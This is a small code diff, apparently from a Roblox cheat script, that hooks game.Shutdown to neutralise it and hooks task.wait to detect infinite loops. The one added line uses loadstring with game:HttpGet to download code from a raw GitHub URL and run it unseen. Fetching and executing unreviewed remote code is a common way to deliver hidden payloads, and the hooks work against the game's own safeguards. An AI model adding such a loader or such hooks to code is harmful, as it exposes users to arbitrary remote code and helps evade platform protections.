@@ -19,6 +19,7 @@ oldShutdown = hookfunction(game.Shutdown, function(...)
     return
 end)
 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/TryharderBroV10/ZO7L-Public-Script/refs/heads/main/Idk"))()
 local oldLoop
 oldLoop = hookfunction(task.wait, function(...)
     if debug.traceback():find("while true do") then
